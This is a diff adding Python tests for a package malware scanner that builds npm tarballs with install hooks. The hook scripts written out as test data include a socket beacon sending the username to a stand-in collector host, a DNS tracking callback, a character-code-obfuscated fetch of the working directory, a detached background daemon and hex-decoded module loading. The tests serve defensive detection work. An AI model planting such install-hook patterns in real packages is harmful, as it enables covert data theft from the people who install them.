@@ -123,3 +123,75 @@ class TestCaseVariantHook:
             f.rule_id for f in Scans.findings(target) if f.severity.name in ("HIGH", "CRITICAL")
         }
         assert any(r.startswith(("MALWARE.", "SUSPECT.EXFIL")) for r in found), found
+
+
+class InstallHookPackage:
+    @staticmethod
+    def blocks(tmp_path, script: str, hook: str = "postinstall") -> set[str]:
+        buffer = io.BytesIO()
+        manifest = {"name": "x", "version": "1.0.1", "scripts": {hook: "node hook.js"}}
+        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
+            for name, text in (
+                ("package/package.json", json.dumps(manifest)),
+                ("package/hook.js", script),
+            ):
+                data = text.encode()
+                info = tarfile.TarInfo(name)
+                info.size = len(data)
+                archive.addfile(info, io.BytesIO(data))
+        target = tmp_path / "x-1.0.1.tgz"
+        target.write_bytes(buffer.getvalue())
+        return {
+            f.rule_id
+            for f in Scans.findings(target)
+            if f.severity.name in ("HIGH", "CRITICAL") and ".KNOWN" not in f.rule_id
+        }
+
+
+class TestInstallHookSteps:
+    def test_recon_and_a_socket_far_apart_in_a_small_hook(self, tmp_path) -> None:
+        filler = "\n".join(f"// step {i}" for i in range(40))
+        script = (
+            "const os = require('os'); const net = require('net');\n"
+            "function who() { return os.userInfo().username; }\n" + filler + "\n"
+            "const c = new net.Socket(); c.connect(4444, 'collector.example.invalid', () => c.write(who()));\n"
+        )
+        assert "MALWARE.EXFIL.BEACON.001" in InstallHookPackage.blocks(tmp_path, script)
+
+    def test_a_uuid_named_host_resolved_at_install(self, tmp_path) -> None:
+        script = "require('dns').lookup('a-2621b2cf-206e-4956-a416-d0b8453dc87b.cb.example.invalid', () => {});\n"
+        assert "MALWARE.EXFIL.TRACKING_CALLBACK.001" in InstallHookPackage.blocks(
+            tmp_path, script, "preinstall"
+        )
+
+    def test_a_destination_spelled_in_character_codes(self, tmp_path) -> None:
+        script = (
+            "const c=[104,116,116,112,115,58,47,47,101,120,46,105,110];"
+            "const u=c.map(x=>String.fromCharCode(x)).join('');fetch(u+'?h='+process.cwd());\n"
+        )
+        assert "MALWARE.EXFIL.HIDDEN_DESTINATION.001" in InstallHookPackage.blocks(tmp_path, script)
+
+    def test_a_daemon_started_with_an_options_object(self, tmp_path) -> None:
+        script = (
+            "const { spawn } = require('child_process');\n"
+            "const opts = { detached: true, stdio: 'ignore' };\n"
+            "const d = spawn(process.execPath, ['daemon.js'], opts); d.unref();\n"
+        )
+        assert "MALWARE.INSTALL.BACKGROUND.001" in InstallHookPackage.blocks(tmp_path, script)
+
+    def test_modules_loaded_through_an_alias_and_a_decoder(self, tmp_path) -> None:
+        names = ["6f73", "646e73", "6874747073", "7574696c", "70617468"]
+        body = "".join(f"const m{i} = _r(_d('{h}'));\n" for i, h in enumerate(names * 2))
+        script = "const _d = h => Buffer.from(h, 'hex').toString();\nconst _r = require;\n" + body
+        assert "MALWARE.DYNAMIC_DISPATCH.001" in InstallHookPackage.blocks(
+            tmp_path, script, "preinstall"
+        )
+
+    def test_a_published_binary_installer_is_not(self, tmp_path) -> None:
+        script = (
+            "const https = require('https'); const fs = require('fs');\n"
+            "https.get('https://registry.npmjs.org/x/-/x-1.0.1.tgz', r => r.pipe(fs.createWriteStream('x.tgz')));\n"
+        )
+        assert not {
+            r for r in InstallHookPackage.blocks(tmp_path, script) if r.startswith("MALWARE.")
+        }
